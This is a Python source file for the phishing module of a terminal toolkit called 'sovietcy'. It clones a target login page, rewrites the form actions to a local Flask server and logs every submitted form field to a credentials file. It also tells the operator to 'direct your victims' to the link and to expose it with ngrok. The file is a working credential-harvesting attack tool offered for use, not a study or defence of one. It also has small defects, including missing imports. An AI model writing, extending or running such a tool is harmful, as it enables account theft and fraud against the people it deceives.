# sovietcy/phishing_tool.py
from textual.widgets import Static, Button, Input
from textual.containers import Container, VerticalScroll, Horizontal
from textual.app import ComposeResult
from textual.reactive import reactive

import threading
import os
import requests
from urllib.parse import urlparse
from flask import Flask, request, redirect, render_template_string, send_from_directory
import logging

# Suppress Flask and Werkzeug logs for cleaner terminal output
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)
logging.getLogger('flask.app').setLevel(logging.ERROR)

class PhishingTool(Static):
    BINDINGS = [
        ("c", "clone_site", "Clone Site"),
        ("s", "start_phish_server", "Start Phish Server"),
        ("x", "stop_phish_server", "Stop Phish Server"),
        ("v", "view_credentials", "View Credentials"),
        ("b", "back_to_main", "Back"),
    ]

    phish_url = reactive("")
    server_status = reactive("Stopped")
    
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.phishing_server_thread = None
        self.flask_app = Flask(__name__, template_folder=self._get_template_path(), static_folder=self._get_template_path())
        self.phish_target_url = ""
        self.credentials_log_path = os.path.join(os.getcwd(), "sovietcy_credentials.log")

        # Flask route definitions (within the PhishingTool class to control scope)
        @self.flask_app.route('/', defaults={'path': ''}, methods=['GET', 'POST'])
        @self.flask_app.route('/<path:path>', methods=['GET', 'POST'])
        def catch_all(path):
            if request.method == 'POST':
                self._log_credentials(request.form)
                # Redirect to original site or another page after credential capture
                return redirect(self.phish_target_url or "http://example.com")
            
            # Serve cloned content
            cloned_path = os.path.join(self._get_template_path(), path)
            if os.path.isdir(cloned_path):
                 return send_from_directory(self._get_template_path(), 'index.html')
            elif os.path.exists(cloned_path):
                 return send_from_directory(self._get_template_path(), path)
            else:
                 # Attempt to serve index.html or 404
                 try:
                     return send_from_directory(self._get_template_path(), 'index.html')
                 except Exception:
                     return "404 Not Found - Sovietcy Phish Site", 404

    def _get_template_path(self):
        # Path to where cloned site will be stored
        pkg_root = os.path.dirname(os.path.abspath(__file__))
        phish_dir = os.path.join(pkg_root, "cloned_site")
        os.makedirs(phish_dir, exist_ok=True)
        return phish_dir

    def _log_credentials(self, form_data):
        with open(self.credentials_log_path, "a") as f:
            f.write(f"[{datetime.datetime.now().isoformat()}] Captured from {self.phish_target_url}:\n")
            for key, value in form_data.items():
                f.write(f"  {key}: {value}\n")
            f.write("-" * 30 + "\n")
        self.query_one("#phish_log").write(f"[bold red]Credentials captured![/bold red] Logged to: {self.credentials_log_path}")

    def compose(self) -> ComposeResult:
        yield Static("### Phishing Tool Module ###", classes="module-header")
        yield Static("Target URL for Cloning:")
        yield Input(placeholder="e.g., https://login.microsoftonline.com", id="phish_url_input")
        with Horizontal():
            yield Button("Clone Site (C)", id="phish_clone_btn", variant="primary")
            yield Button("Start Server (S)", id="phish_start_btn", variant="success")
            yield Button("Stop Server (X)", id="phish_stop_btn", variant="error")
            yield Button("View Credentials (V)", id="phish_view_creds_btn", variant="warning")
            yield Button("Back (B)", id="phish_back_btn", variant="primary")
        yield Static(f"Server Status: [bold]{self.server_status}[/bold]", id="server_status_display")
        yield Static(f"Phishing Link: [bold green]{self.phish_url}[/bold green]", id="phish_link_display")
        yield Static("Phishing Log:")
        yield RichLog(id="phish_log", auto_scroll=True)

    def watch_server_status(self, old_status: str, new_status: str) -> None:
        self.query_one("#server_status_display", Static).update(f"Server Status: [bold]{new_status}[/bold]")

    def watch_phish_url(self, old_url: str, new_url: str) -> None:
        self.query_one("#phish_link_display", Static).update(f"Phishing Link: [bold green]{new_url}[/bold green]")

    def display_initial_options(self):
        self.query_one("#phish_log").clear()
        self.query_one("#phish_log").write("Enter target URL and press 'C' to clone.")
        self.query_one("#phish_log").write("Then press 'S' to start the phishing server.")

    def action_clone_site(self) -> None:
        target_url = self.query_one("#phish_url_input", Input).value
        if not target_url:
            self.query_one("#phish_log").write("[bold red]Error:[/bold red] Please enter a target URL.")
            return

        self.phish_target_url = target_url
        self.query_one("#phish_log").write(f"Attempting to clone: {target_url}...")

        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
            response = requests.get(target_url, headers=headers)
            response.raise_for_status() # Raise HTTPError for bad responses (4xx or 5xx)

            # Basic cloning: save the HTML
            # For a truly dangerous tool, this would parse HTML, rewrite relative paths, download assets (CSS, JS, images)
            # and inject malicious JavaScript for advanced credential capture (e.g., keyloggers, session hijacking)
            # This is a simplified version.
            parsed_url = urlparse(target_url)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"

            cloned_dir = self._get_template_path()
            html_content = response.text

            # Simple rewrite for common form actions to point to our server
            # This is extremely basic; a real tool needs a robust HTML parser like BeautifulSoup
            # and intelligent path rewriting.
            html_content = html_content.replace(f'action="{base_url}', 'action="/')
            html_content = html_content.replace(f"action='{base_url}", "action='/")
            html_content = html_content.replace('action="/"', 'action="./"') # Ensure relative to root of our server

            with open(os.path.join(cloned_dir, "index.html"), "w", encoding="utf-8") as f:
                f.write(html_content)

            self.query_one("#phish_log").write(f"[bold green]Successfully cloned[/bold green] '{target_url}' to '{cloned_dir}/index.html'.")
            self.query_one("#phish_log").write("Now, start the phishing server.")

        except requests.exceptions.RequestException as e:
            self.query_one("#phish_log").write(f"[bold red]Error cloning site:[/bold red] {e}")
        except Exception as e:
            self.query_one("#phish_log").write(f"[bold red]An unexpected error occurred:[/bold red] {e}")


    def _run_flask_server(self, host="0.0.0.0", port=80):
        try:
            self.flask_app.run(host=host, port=port, debug=False, use_reloader=False)
        except Exception as e:
            self.post_message(Static(f"[bold red]Flask server error:[/bold red] {e}"))
        finally:
            self.post_message(Static("[bold red]Phishing server thread terminated.[/bold red]"))


    def action_start_phish_server(self) -> None:
        if self.phishing_server_thread and self.phishing_server_thread.is_alive():
            self.query_one("#phish_log").write("Phishing server is already running.")
            return

        # Check if index.html exists in cloned_site directory
        if not os.path.exists(os.path.join(self._get_template_path(), "index.html")):
            self.query_one("#phish_log").write("[bold red]Error:[/bold red] No cloned site found. Please clone a site first.")
            return

        port = 80 # Default for web traffic, requires root/admin
        try:
            self.phishing_server_thread = threading.Thread(target=self._run_flask_server, args=("0.0.0.0", port))
            self.phishing_server_thread.daemon = True # Allow main program to exit even if server thread is running
            self.phishing_server_thread.start()
            self.server_status = "Running"
            self.phish_url = f"http://YOUR_IP_ADDRESS:{port}/" # User needs to replace YOUR_IP_ADDRESS
            self.query_one("#phish_log").write(f"[bold green]Phishing server started[/bold green] on http://0.0.0.0:{port}/")
            self.query_one("#phish_log").write(f"Direct your victims to: [bold underline]{self.phish_url}[/bold underline]")
            self.query_one("#phish_log").write("Remember to configure port forwarding or use tools like `ngrok` for external access.")
        except Exception as e:
            self.server_status = "Stopped (Error)"
            self.query_one("#phish_log").write(f"[bold red]Failed to start server:[/bold red] {e}")

    def action_stop_phish_server(self) -> None:
        if self.phishing_server_thread and self.phishing_server_thread.is_alive():
            # Flask's run() method does not have a clean stop function.
            # A common workaround is to send a shutdown request or use os._exit() for aggressive termination.
            # For a proper, production-grade server, you'd use a WSGI server like Gunicorn/Waitress which
            # have graceful shutdown mechanisms.
            self.query_one("#phish_log").write("Attempting to stop phishing server... (May take a moment)")
            # This is a hacky way to shut down Flask
            requests.post("http://127.0.0.1:80/shutdown") # Assuming default port
            self.phishing_server_thread.join(timeout=3) # Give it a moment to shut down
            if self.phishing_server_thread.is_alive():
                self.query_one("#phish_log").write("[bold red]Warning: Server thread may not have stopped gracefully. You might need to kill the process manually.[/bold red]")
            else:
                self.query_one("#phish_log").write("Phishing server stopped.")
            self.server_status = "Stopped"
            self.phish_url = ""
        else:
            self.query_one("#phish_log").write("Phishing server is not running.")

    def action_view_credentials(self) -> None:
        if not os.path.exists(self.credentials_log_path):
            self.query_one("#phish_log").write("[bold yellow]No credentials log found yet.[/bold yellow]")
            return
        
        try:
            with open(self.credentials_log_path, "r") as f:
                creds = f.read()
            self.query_one("#phish_log").write("\n--- Captured Credentials ---\n")
            self.query_one("#phish_log").write(creds)
            self.query_one("#phish_log").write("--- End of Credentials ---\n")
        except Exception as e:
            self.query_one("#phish_log").write(f"[bold red]Error reading credentials log:[/bold red] {e}")

    def action_back_to_main(self) -> None:
        self.action_stop_phish_server() # Ensure server stops
        self.add_class("hidden")
        self.app.query_one("#main-menu").remove_class("hidden")
        self.app.query_one("#main_log").remove_class("hidden")
        self.app.query_one("#main_log").write("Returned to main menu.")

